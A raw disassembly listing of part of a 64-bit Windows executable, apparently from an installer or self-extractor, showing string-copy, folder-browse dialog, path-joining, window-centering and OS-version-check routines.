   140003a2e:	48 85 c0             	test   %rax,%rax
   140003a31:	75 34                	jne    0x140003a67
   140003a33:	21 44 24 28          	and    %eax,0x28(%rsp)
   140003a37:	45 33 c9             	xor    %r9d,%r9d
   140003a3a:	48 8b 0d a7 ae 00 00 	mov    0xaea7(%rip),%rcx        # 0x14000e8e8
   140003a41:	45 33 c0             	xor    %r8d,%r8d
   140003a44:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140003a49:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003a50:	00 
   140003a51:	e8 82 29 00 00       	call   0x1400063d8
   140003a56:	48 8b cf             	mov    %rdi,%rcx
   140003a59:	48 ff 15 f8 78 00 00 	rex.W call *0x78f8(%rip)        # 0x14000b358
   140003a60:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a65:	eb 96                	jmp    0x1400039fd
   140003a67:	48 ff c3             	inc    %rbx
   140003a6a:	80 3c 1e 00          	cmpb   $0x0,(%rsi,%rbx,1)
   140003a6e:	75 f7                	jne    0x140003a67
   140003a70:	48 83 c3 01          	add    $0x1,%rbx
   140003a74:	74 42                	je     0x140003ab8
   140003a76:	48 81 fb ff ff ff 7f 	cmp    $0x7fffffff,%rbx
   140003a7d:	76 05                	jbe    0x140003a84
   140003a7f:	c6 00 00             	movb   $0x0,(%rax)
   140003a82:	eb 34                	jmp    0x140003ab8
   140003a84:	b9 fe ff ff 7f       	mov    $0x7ffffffe,%ecx
   140003a89:	48 2b cb             	sub    %rbx,%rcx
   140003a8c:	48 2b f0             	sub    %rax,%rsi
   140003a8f:	48 8d 04 19          	lea    (%rcx,%rbx,1),%rax
   140003a93:	48 85 c0             	test   %rax,%rax
   140003a96:	74 12                	je     0x140003aaa
   140003a98:	8a 04 16             	mov    (%rsi,%rdx,1),%al
   140003a9b:	84 c0                	test   %al,%al
   140003a9d:	74 0b                	je     0x140003aaa
   140003a9f:	88 02                	mov    %al,(%rdx)
   140003aa1:	48 ff c2             	inc    %rdx
   140003aa4:	48 83 eb 01          	sub    $0x1,%rbx
   140003aa8:	75 e5                	jne    0x140003a8f
   140003aaa:	48 85 db             	test   %rbx,%rbx
   140003aad:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
   140003ab1:	48 0f 45 ca          	cmovne %rdx,%rcx
   140003ab5:	c6 01 00             	movb   $0x0,(%rcx)
   140003ab8:	48 8b 0d 89 bc 00 00 	mov    0xbc89(%rip),%rcx        # 0x14000f748
   140003abf:	b8 01 00 00 00       	mov    $0x1,%eax
   140003ac4:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   140003ac8:	48 89 3d 79 bc 00 00 	mov    %rdi,0xbc79(%rip)        # 0x14000f748
   140003acf:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003ad4:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140003ad9:	48 83 c4 30          	add    $0x30,%rsp
   140003add:	5f                   	pop    %rdi
   140003ade:	c3                   	ret
   140003adf:	cc                   	int3
   140003ae0:	cc                   	int3
   140003ae1:	cc                   	int3
   140003ae2:	cc                   	int3
   140003ae3:	cc                   	int3
   140003ae4:	cc                   	int3
   140003ae5:	cc                   	int3
   140003ae6:	cc                   	int3
   140003ae7:	cc                   	int3
   140003ae8:	cc                   	int3
   140003ae9:	cc                   	int3
   140003aea:	cc                   	int3
   140003aeb:	cc                   	int3
   140003aec:	cc                   	int3
   140003aed:	cc                   	int3
   140003aee:	cc                   	int3
   140003aef:	cc                   	int3
   140003af0:	48 83 ec 28          	sub    $0x28,%rsp
   140003af4:	83 fa 01             	cmp    $0x1,%edx
   140003af7:	75 17                	jne    0x140003b10
   140003af9:	ba 66 04 00 00       	mov    $0x466,%edx
   140003afe:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003b04:	48 ff 15 35 7b 00 00 	rex.W call *0x7b35(%rip)        # 0x14000b640
   140003b0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b10:	33 c0                	xor    %eax,%eax
   140003b12:	48 83 c4 28          	add    $0x28,%rsp
   140003b16:	c3                   	ret
   140003b17:	cc                   	int3
   140003b18:	cc                   	int3
   140003b19:	cc                   	int3
   140003b1a:	cc                   	int3
   140003b1b:	cc                   	int3
   140003b1c:	cc                   	int3
   140003b1d:	cc                   	int3
   140003b1e:	cc                   	int3
   140003b1f:	cc                   	int3
   140003b20:	48 8b c4             	mov    %rsp,%rax
   140003b23:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003b27:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003b2b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003b2f:	57                   	push   %rdi
   140003b30:	41 54                	push   %r12
   140003b32:	41 55                	push   %r13
   140003b34:	41 56                	push   %r14
   140003b36:	41 57                	push   %r15
   140003b38:	48 83 ec 70          	sub    $0x70,%rsp
   140003b3c:	48 8b e9             	mov    %rcx,%rbp
   140003b3f:	33 db                	xor    %ebx,%ebx
   140003b41:	48 8d 0d 18 a7 00 00 	lea    0xa718(%rip),%rcx        # 0x14000e260
   140003b48:	89 58 bc             	mov    %ebx,-0x44(%rax)
   140003b4b:	48 89 58 d0          	mov    %rbx,-0x30(%rax)
   140003b4f:	48 ff 15 aa 77 00 00 	rex.W call *0x77aa(%rip)        # 0x14000b300
   140003b56:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b5b:	48 8b f0             	mov    %rax,%rsi
   140003b5e:	48 85 c0             	test   %rax,%rax
   140003b61:	0f 84 97 01 00 00    	je     0x140003cfe
   140003b67:	48 8d 15 12 a7 00 00 	lea    0xa712(%rip),%rdx        # 0x14000e280
   140003b6e:	48 8b c8             	mov    %rax,%rcx
   140003b71:	48 ff 15 d0 77 00 00 	rex.W call *0x77d0(%rip)        # 0x14000b348
   140003b78:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b7d:	4c 8b e0             	mov    %rax,%r12
   140003b80:	48 85 c0             	test   %rax,%rax
   140003b83:	0f 84 5f 01 00 00    	je     0x140003ce8
   140003b89:	ba c3 00 00 00       	mov    $0xc3,%edx
   140003b8e:	48 8b ce             	mov    %rsi,%rcx
   140003b91:	48 ff 15 b0 77 00 00 	rex.W call *0x77b0(%rip)        # 0x14000b348
   140003b98:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b9d:	4c 8b e8             	mov    %rax,%r13
   140003ba0:	48 85 c0             	test   %rax,%rax
   140003ba3:	0f 84 3f 01 00 00    	je     0x140003ce8
   140003ba9:	48 8d 15 e8 a6 00 00 	lea    0xa6e8(%rip),%rdx        # 0x14000e298
   140003bb0:	48 8b ce             	mov    %rsi,%rcx
   140003bb3:	48 ff 15 8e 77 00 00 	rex.W call *0x778e(%rip)        # 0x14000b348
   140003bba:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bbf:	4c 8b f8             	mov    %rax,%r15
   140003bc2:	48 85 c0             	test   %rax,%rax
   140003bc5:	0f 84 1d 01 00 00    	je     0x140003ce8
   140003bcb:	38 1d 0f b1 00 00    	cmp    %bl,0xb10f(%rip)        # 0x14000ece0
   140003bd1:	48 8d 3d 08 b1 00 00 	lea    0xb108(%rip),%rdi        # 0x14000ece0
   140003bd8:	75 48                	jne    0x140003c22
   140003bda:	48 8b d7             	mov    %rdi,%rdx
   140003bdd:	e8 c6 2b 00 00       	call   0x1400067a8
   140003be2:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140003be6:	48 ff c2             	inc    %rdx
   140003be9:	38 1c 17             	cmp    %bl,(%rdi,%rdx,1)
   140003bec:	75 f8                	jne    0x140003be6
   140003bee:	48 03 d7             	add    %rdi,%rdx
   140003bf1:	48 8b cf             	mov    %rdi,%rcx
   140003bf4:	48 ff 15 f5 79 00 00 	rex.W call *0x79f5(%rip)        # 0x14000b5f0
   140003bfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003c00:	4c 8b f0             	mov    %rax,%r14
   140003c03:	80 38 5c             	cmpb   $0x5c,(%rax)
   140003c06:	75 1a                	jne    0x140003c22
   140003c08:	48 8b d0             	mov    %rax,%rdx
   140003c0b:	48 8b cf             	mov    %rdi,%rcx
   140003c0e:	48 ff 15 db 79 00 00 	rex.W call *0x79db(%rip)        # 0x14000b5f0
   140003c15:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003c1a:	80 38 3a             	cmpb   $0x3a,(%rax)
   140003c1d:	74 03                	je     0x140003c22
   140003c1f:	41 88 1e             	mov    %bl,(%r14)
   140003c22:	48 8d 05 67 ad 00 00 	lea    0xad67(%rip),%rax        # 0x14000e990
   140003c29:	88 1d 71 af 00 00    	mov    %bl,0xaf71(%rip)        # 0x14000eba0
   140003c2f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003c34:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003c39:	48 8d 05 b0 fe ff ff 	lea    -0x150(%rip),%rax        # 0x140003af0
   140003c40:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003c45:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003c4a:	49 8b c4             	mov    %r12,%rax
   140003c4d:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140003c52:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140003c57:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140003c5e:	00 
   140003c5f:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140003c64:	e8 a7 63 00 00       	call   0x14000a010
   140003c69:	48 8b e8             	mov    %rax,%rbp
   140003c6c:	48 85 c0             	test   %rax,%rax
   140003c6f:	74 5b                	je     0x140003ccc
   140003c71:	48 8b c8             	mov    %rax,%rcx
   140003c74:	48 8b d7             	mov    %rdi,%rdx
   140003c77:	49 8b c7             	mov    %r15,%rax
   140003c7a:	e8 91 63 00 00       	call   0x14000a010
   140003c7f:	38 1d 5b b0 00 00    	cmp    %bl,0xb05b(%rip)        # 0x14000ece0
   140003c85:	74 3a                	je     0x140003cc1
   140003c87:	48 8d 0d 12 af 00 00 	lea    0xaf12(%rip),%rcx        # 0x14000eba0
   140003c8e:	ba 04 01 00 00       	mov    $0x104,%edx
   140003c93:	48 2b f9             	sub    %rcx,%rdi
   140003c96:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140003c9d:	48 85 c0             	test   %rax,%rax
   140003ca0:	74 12                	je     0x140003cb4
   140003ca2:	8a 04 0f             	mov    (%rdi,%rcx,1),%al
   140003ca5:	84 c0                	test   %al,%al
   140003ca7:	74 0b                	je     0x140003cb4
   140003ca9:	88 01                	mov    %al,(%rcx)
   140003cab:	48 ff c1             	inc    %rcx
   140003cae:	48 83 ea 01          	sub    $0x1,%rdx
   140003cb2:	75 e2                	jne    0x140003c96
   140003cb4:	48 85 d2             	test   %rdx,%rdx
   140003cb7:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140003cbb:	48 0f 45 c1          	cmovne %rcx,%rax
   140003cbf:	88 18                	mov    %bl,(%rax)
   140003cc1:	48 8b cd             	mov    %rbp,%rcx
   140003cc4:	49 8b c5             	mov    %r13,%rax
   140003cc7:	e8 44 63 00 00       	call   0x14000a010
   140003ccc:	48 8b ce             	mov    %rsi,%rcx
   140003ccf:	48 ff 15 92 76 00 00 	rex.W call *0x7692(%rip)        # 0x14000b368
   140003cd6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003cdb:	38 1d bf ae 00 00    	cmp    %bl,0xaebf(%rip)        # 0x14000eba0
   140003ce1:	0f 95 c3             	setne  %bl
   140003ce4:	8b c3                	mov    %ebx,%eax
   140003ce6:	eb 37                	jmp    0x140003d1f
   140003ce8:	48 8b ce             	mov    %rsi,%rcx
   140003ceb:	48 ff 15 76 76 00 00 	rex.W call *0x7676(%rip)        # 0x14000b368
   140003cf2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003cf7:	ba c1 04 00 00       	mov    $0x4c1,%edx
   140003cfc:	eb 05                	jmp    0x140003d03
   140003cfe:	ba c2 04 00 00       	mov    $0x4c2,%edx
   140003d03:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140003d07:	45 33 c9             	xor    %r9d,%r9d
   140003d0a:	45 33 c0             	xor    %r8d,%r8d
   140003d0d:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003d14:	00 
   140003d15:	48 8b cd             	mov    %rbp,%rcx
   140003d18:	e8 bb 26 00 00       	call   0x1400063d8
   140003d1d:	33 c0                	xor    %eax,%eax
   140003d1f:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140003d24:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140003d28:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140003d2c:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140003d30:	49 8b e3             	mov    %r11,%rsp
   140003d33:	41 5f                	pop    %r15
   140003d35:	41 5e                	pop    %r14
   140003d37:	41 5d                	pop    %r13
   140003d39:	41 5c                	pop    %r12
   140003d3b:	5f                   	pop    %rdi
   140003d3c:	c3                   	ret
   140003d3d:	cc                   	int3
   140003d3e:	cc                   	int3
   140003d3f:	cc                   	int3
   140003d40:	cc                   	int3
   140003d41:	cc                   	int3
   140003d42:	cc                   	int3
   140003d43:	cc                   	int3
   140003d44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003d49:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003d4e:	57                   	push   %rdi
   140003d4f:	48 83 ec 20          	sub    $0x20,%rsp
   140003d53:	49 83 ca ff          	or     $0xffffffffffffffff,%r10
   140003d57:	48 8b d9             	mov    %rcx,%rbx
   140003d5a:	49 8b ca             	mov    %r10,%rcx
   140003d5d:	49 8b f9             	mov    %r9,%rdi
   140003d60:	48 ff c1             	inc    %rcx
   140003d63:	41 80 3c 08 00       	cmpb   $0x0,(%r8,%rcx,1)
   140003d68:	75 f6                	jne    0x140003d60
   140003d6a:	49 8b c2             	mov    %r10,%rax
   140003d6d:	48 ff c0             	inc    %rax
   140003d70:	41 80 3c 01 00       	cmpb   $0x0,(%r9,%rax,1)
   140003d75:	75 f6                	jne    0x140003d6d
   140003d77:	ff c0                	inc    %eax
   140003d79:	bd 04 01 00 00       	mov    $0x104,%ebp
   140003d7e:	03 c1                	add    %ecx,%eax
   140003d80:	3b c5                	cmp    %ebp,%eax
   140003d82:	0f 8d 85 00 00 00    	jge    0x140003e0d
   140003d88:	8b d5                	mov    %ebp,%edx
   140003d8a:	48 8b cb             	mov    %rbx,%rcx
   140003d8d:	4c 2b c3             	sub    %rbx,%r8
   140003d90:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   140003d97:	48 85 c0             	test   %rax,%rax
   140003d9a:	74 13                	je     0x140003daf
   140003d9c:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140003da0:	84 c0                	test   %al,%al
   140003da2:	74 0b                	je     0x140003daf
   140003da4:	88 01                	mov    %al,(%rcx)
   140003da6:	48 ff c1             	inc    %rcx
   140003da9:	48 83 ea 01          	sub    $0x1,%rdx
   140003dad:	75 e1                	jne    0x140003d90
   140003daf:	48 85 d2             	test   %rdx,%rdx
   140003db2:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140003db6:	48 0f 45 c1          	cmovne %rcx,%rax
   140003dba:	c6 00 00             	movb   $0x0,(%rax)
   140003dbd:	49 8b c2             	mov    %r10,%rax
   140003dc0:	48 ff c0             	inc    %rax
   140003dc3:	80 3c 03 00          	cmpb   $0x0,(%rbx,%rax,1)
   140003dc7:	75 f7                	jne    0x140003dc0
   140003dc9:	80 7c 18 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rbx,1)
   140003dce:	74 28                	je     0x140003df8
   140003dd0:	49 ff c2             	inc    %r10
   140003dd3:	42 80 3c 13 00       	cmpb   $0x0,(%rbx,%r10,1)
   140003dd8:	75 f6                	jne    0x140003dd0
   140003dda:	41 80 7c 1a ff 2f    	cmpb   $0x2f,-0x1(%r10,%rbx,1)
   140003de0:	74 16                	je     0x140003df8
   140003de2:	4c 8d 05 63 7b 00 00 	lea    0x7b63(%rip),%r8        # 0x14000b94c
   140003de9:	48 8b d5             	mov    %rbp,%rdx
   140003dec:	48 8b cb             	mov    %rbx,%rcx
   140003def:	e8 90 f9 ff ff       	call   0x140003784
   140003df4:	85 c0                	test   %eax,%eax
   140003df6:	78 15                	js     0x140003e0d
   140003df8:	4c 8b c7             	mov    %rdi,%r8
   140003dfb:	48 8b d5             	mov    %rbp,%rdx
   140003dfe:	48 8b cb             	mov    %rbx,%rcx
   140003e01:	e8 7e f9 ff ff       	call   0x140003784
   140003e06:	b8 01 00 00 00       	mov    $0x1,%eax
   140003e0b:	eb 02                	jmp    0x140003e0f
   140003e0d:	33 c0                	xor    %eax,%eax
   140003e0f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e14:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003e19:	48 83 c4 20          	add    $0x20,%rsp
   140003e1d:	5f                   	pop    %rdi
   140003e1e:	c3                   	ret
   140003e1f:	cc                   	int3
   140003e20:	cc                   	int3
   140003e21:	cc                   	int3
   140003e22:	cc                   	int3
   140003e23:	cc                   	int3
   140003e24:	cc                   	int3
   140003e25:	cc                   	int3
   140003e26:	cc                   	int3
   140003e27:	cc                   	int3
   140003e28:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003e2d:	55                   	push   %rbp
   140003e2e:	56                   	push   %rsi
   140003e2f:	57                   	push   %rdi
   140003e30:	41 54                	push   %r12
   140003e32:	41 55                	push   %r13
   140003e34:	41 56                	push   %r14
   140003e36:	41 57                	push   %r15
   140003e38:	48 8b ec             	mov    %rsp,%rbp
   140003e3b:	48 83 ec 70          	sub    $0x70,%rsp
   140003e3f:	48 8b 05 3a a2 00 00 	mov    0xa23a(%rip),%rax        # 0x14000e080
   140003e46:	48 33 c4             	xor    %rsp,%rax
   140003e49:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003e4d:	48 8b da             	mov    %rdx,%rbx
   140003e50:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140003e54:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003e57:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140003e5b:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003e5e:	4c 8b e1             	mov    %rcx,%r12
   140003e61:	0f 11 45 e8          	movups %xmm0,-0x18(%rbp)
   140003e65:	0f 11 4d d8          	movups %xmm1,-0x28(%rbp)
   140003e69:	48 ff 15 30 77 00 00 	rex.W call *0x7730(%rip)        # 0x14000b5a0
   140003e70:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003e75:	44 8b 7d f0          	mov    -0x10(%rbp),%r15d
   140003e79:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140003e7d:	8b 75 f4             	mov    -0xc(%rbp),%esi
   140003e80:	48 8b cb             	mov    %rbx,%rcx
   140003e83:	44 2b 7d e8          	sub    -0x18(%rbp),%r15d
   140003e87:	2b 75 ec             	sub    -0x14(%rbp),%esi
   140003e8a:	48 ff 15 0f 77 00 00 	rex.W call *0x770f(%rip)        # 0x14000b5a0
   140003e91:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003e96:	8b 7d e0             	mov    -0x20(%rbp),%edi
   140003e99:	49 8b cc             	mov    %r12,%rcx
   140003e9c:	44 8b 75 e4          	mov    -0x1c(%rbp),%r14d
   140003ea0:	2b 7d d8             	sub    -0x28(%rbp),%edi
   140003ea3:	44 2b 75 dc          	sub    -0x24(%rbp),%r14d
   140003ea7:	48 ff 15 ea 76 00 00 	rex.W call *0x76ea(%rip)        # 0x14000b598
   140003eae:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003eb3:	48 8b c8             	mov    %rax,%rcx
   140003eb6:	ba 08 00 00 00       	mov    $0x8,%edx
   140003ebb:	48 8b d8             	mov    %rax,%rbx
   140003ebe:	48 ff 15 fb 73 00 00 	rex.W call *0x73fb(%rip)        # 0x14000b2c0
   140003ec5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003eca:	ba 0a 00 00 00       	mov    $0xa,%edx
   140003ecf:	48 8b cb             	mov    %rbx,%rcx
   140003ed2:	44 8b e0             	mov    %eax,%r12d
   140003ed5:	48 ff 15 e4 73 00 00 	rex.W call *0x73e4(%rip)        # 0x14000b2c0
   140003edc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003ee1:	48 8b d3             	mov    %rbx,%rdx
   140003ee4:	48 8b 5d d0          	mov    -0x30(%rbp),%rbx
   140003ee8:	48 8b cb             	mov    %rbx,%rcx
   140003eeb:	44 8b e8             	mov    %eax,%r13d
   140003eee:	48 ff 15 1b 77 00 00 	rex.W call *0x771b(%rip)        # 0x14000b610
   140003ef5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003efa:	41 2b ff             	sub    %r15d,%edi
   140003efd:	8b c7                	mov    %edi,%eax
   140003eff:	99                   	cltd
   140003f00:	2b c2                	sub    %edx,%eax
   140003f02:	d1 f8                	sar    $1,%eax
   140003f04:	44 8b c0             	mov    %eax,%r8d
   140003f07:	44 03 45 d8          	add    -0x28(%rbp),%r8d
   140003f0b:	79 05                	jns    0x140003f12
   140003f0d:	45 33 c0             	xor    %r8d,%r8d
   140003f10:	eb 0f                	jmp    0x140003f21
   140003f12:	43 8d 0c 38          	lea    (%r8,%r15,1),%ecx
   140003f16:	41 3b cc             	cmp    %r12d,%ecx
   140003f19:	7e 06                	jle    0x140003f21
   140003f1b:	45 8b c4             	mov    %r12d,%r8d
   140003f1e:	45 2b c7             	sub    %r15d,%r8d
   140003f21:	44 2b f6             	sub    %esi,%r14d
   140003f24:	41 8b c6             	mov    %r14d,%eax
   140003f27:	99                   	cltd
   140003f28:	2b c2                	sub    %edx,%eax
   140003f2a:	d1 f8                	sar    $1,%eax
   140003f2c:	44 8b c8             	mov    %eax,%r9d
   140003f2f:	44 03 4d dc          	add    -0x24(%rbp),%r9d
   140003f33:	79 05                	jns    0x140003f3a
   140003f35:	45 33 c9             	xor    %r9d,%r9d
   140003f38:	eb 0f                	jmp    0x140003f49
   140003f3a:	41 8d 04 31          	lea    (%r9,%rsi,1),%eax
   140003f3e:	41 3b c5             	cmp    %r13d,%eax
   140003f41:	7e 06                	jle    0x140003f49
   140003f43:	45 8b cd             	mov    %r13d,%r9d
   140003f46:	44 2b ce             	sub    %esi,%r9d
   140003f49:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%rsp)
   140003f50:	00 
   140003f51:	33 d2                	xor    %edx,%edx
   140003f53:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140003f58:	48 8b cb             	mov    %rbx,%rcx
   140003f5b:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140003f60:	48 ff 15 29 76 00 00 	rex.W call *0x7629(%rip)        # 0x14000b590
   140003f67:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003f6c:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140003f70:	48 33 cc             	xor    %rsp,%rcx
   140003f73:	e8 38 5c 00 00       	call   0x140009bb0
   140003f78:	48 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%rbx
   140003f7f:	00 
   140003f80:	48 83 c4 70          	add    $0x70,%rsp
   140003f84:	41 5f                	pop    %r15
   140003f86:	41 5e                	pop    %r14
   140003f88:	41 5d                	pop    %r13
   140003f8a:	41 5c                	pop    %r12
   140003f8c:	5f                   	pop    %rdi
   140003f8d:	5e                   	pop    %rsi
   140003f8e:	5d                   	pop    %rbp
   140003f8f:	c3                   	ret
   140003f90:	cc                   	int3
   140003f91:	cc                   	int3
   140003f92:	cc                   	int3
   140003f93:	cc                   	int3
   140003f94:	cc                   	int3
   140003f95:	cc                   	int3
   140003f96:	cc                   	int3
   140003f97:	cc                   	int3
   140003f98:	48 8b c4             	mov    %rsp,%rax
   140003f9b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140003f9f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003fa3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003fa7:	55                   	push   %rbp
   140003fa8:	41 54                	push   %r12
   140003faa:	41 55                	push   %r13
   140003fac:	41 56                	push   %r14
   140003fae:	41 57                	push   %r15
   140003fb0:	48 8d a8 d8 fe ff ff 	lea    -0x128(%rax),%rbp
   140003fb7:	48 81 ec 00 02 00 00 	sub    $0x200,%rsp
   140003fbe:	48 8b 05 bb a0 00 00 	mov    0xa0bb(%rip),%rax        # 0x14000e080
   140003fc5:	48 33 c4             	xor    %rsp,%rax
   140003fc8:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   140003fcf:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140003fd4:	33 d2                	xor    %edx,%edx
   140003fd6:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   140003fdb:	41 b8 90 00 00 00    	mov    $0x90,%r8d
   140003fe1:	e8 c0 db ff ff       	call   0x140001ba6
   140003fe6:	33 db                	xor    %ebx,%ebx
   140003fe8:	c7 44 24 40 94 00 00 	movl   $0x94,0x40(%rsp)
   140003fef:	00 
   140003ff0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003ff5:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140003ff9:	8b fb                	mov    %ebx,%edi
   140003ffb:	44 8b eb             	mov    %ebx,%r13d
   140003ffe:	48 ff 15 3b 74 00 00 	rex.W call *0x743b(%rip)        # 0x14000b440
   140004005:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000400a:	85 c0                	test   %eax,%eax
   14000400c:	75 1c                	jne    0x14000402a
   14000400e:	bf b4 04 00 00       	mov    $0x4b4,%edi
   140004013:	45 33 c9             	xor    %r9d,%r9d
   140004016:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000401a:	45 33 c0             	xor    %r8d,%r8d
   14000401d:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004024:	00 
   140004025:	e9 a7 02 00 00       	jmp    0x1400042d1
   14000402a:	8b 44 24 50          	mov    0x50(%rsp),%eax
   14000402e:	41 bf 02 00 00 00    	mov    $0x2,%r15d
   140004034:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   140004039:	8b 54 24 44          	mov    0x44(%rsp),%edx
   14000403d:	83 e8 01             	sub    $0x1,%eax
   140004040:	74 67                	je     0x1400040a9
   140004042:	83 f8 01             	cmp    $0x1,%eax
   140004045:	74 07                	je     0x14000404e
   140004047:	bf ca 04 00 00       	mov    $0x4ca,%edi
   14000404c:	eb c5                	jmp    0x140004013
   14000404e:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140004054:	41 0f b7 c7          	movzwl %r15w,%eax
   140004058:	44 89 25 fd a1 00 00 	mov    %r12d,0xa1fd(%rip)        # 0x14000e25c
   14000405f:	44 89 25 f2 a1 00 00 	mov    %r12d,0xa1f2(%rip)        # 0x14000e258
   140004066:	66 89 05 4b bf 00 00 	mov    %ax,0xbf4b(%rip)        # 0x14000ffb8
   14000406d:	41 8d 4c 24 02       	lea    0x2(%r12),%ecx
   140004072:	3b d1                	cmp    %ecx,%edx
   140004074:	77 22                	ja     0x140004098
   140004076:	41 8b c4             	mov    %r12d,%eax
   140004079:	66 89 05 38 bf 00 00 	mov    %ax,0xbf38(%rip)        # 0x14000ffb8
   140004080:	72 08                	jb     0x14000408a
   140004082:	75 43                	jne    0x1400040c7
   140004084:	41 83 f9 33          	cmp    $0x33,%r9d
   140004088:	73 3d                	jae    0x1400040c7
   14000408a:	89 1d cc a1 00 00    	mov    %ebx,0xa1cc(%rip)        # 0x14000e25c
   140004090:	89 1d c2 a1 00 00    	mov    %ebx,0xa1c2(%rip)        # 0x14000e258
   140004096:	eb 2f                	jmp    0x1400040c7
   140004098:	83 fa 05             	cmp    $0x5,%edx
   14000409b:	72 2a                	jb     0x1400040c7
   14000409d:	0f b7 c1             	movzwl %cx,%eax
   1400040a0:	66 89 0d 11 bf 00 00 	mov    %cx,0xbf11(%rip)        # 0x14000ffb8
   1400040a7:	eb 1e                	jmp    0x1400040c7
   1400040a9:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   1400040af:	66 89 1d 02 bf 00 00 	mov    %bx,0xbf02(%rip)        # 0x14000ffb8
   1400040b6:	44 89 25 9f a1 00 00 	mov    %r12d,0xa19f(%rip)        # 0x14000e25c
   1400040bd:	0f b7 c3             	movzwl %bx,%eax
   1400040c0:	44 89 25 91 a1 00 00 	mov    %r12d,0xa191(%rip)        # 0x14000e258
   1400040c7:	39 1d 87 ad 00 00    	cmp    %ebx,0xad87(%rip)        # 0x14000ee54
   1400040cd:	0f 85 07 02 00 00    	jne    0x1400042da
   1400040d3:	4c 8b 54 24 38       	mov    0x38(%rsp),%r10
   1400040d8:	4d 85 d2             	test   %r10,%r10
   1400040db:	0f 84 f9 01 00 00    	je     0x1400042da
   1400040e1:	44 0f b7 5c 24 4c    	movzwl 0x4c(%rsp),%r11d
   1400040e7:	49 8d 72 40          	lea    0x40(%r10),%rsi
   1400040eb:	66 f7 d8             	neg    %ax
   1400040ee:	8b cb                	mov    %ebx,%ecx
   1400040f0:	48 1b c0             	sbb    %rax,%rax
   1400040f3:	48 83 e0 c4          	and    $0xffffffffffffffc4,%rax
   1400040f7:	48 03 f0             	add    %rax,%rsi
